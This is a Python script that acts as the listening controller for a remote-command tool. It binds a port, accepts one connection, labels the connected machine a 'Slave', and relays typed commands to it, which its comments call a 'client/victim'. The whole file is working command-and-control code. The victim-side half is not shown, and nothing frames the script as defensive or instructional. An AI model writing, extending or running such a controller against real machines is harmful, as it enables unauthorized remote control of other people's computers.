import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 1234
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("[ New Slave Detected ] [ IP " + address[0] + " ] [ PORT " + str(address[1]) + " ]")
    send_msg(conn)
    conn.close()

# Send commands to client/victim or a friend
def send_msg(conn):
    while True:
        msg_to_slave = input("=> ")
        if msg_to_slave == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(msg_to_slave)) > 0:
            conn.send(str.encode(msg_to_slave))
            client_response = str(conn.recv(1024),"utf-8")
            print("[Slave] "+client_response)


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()






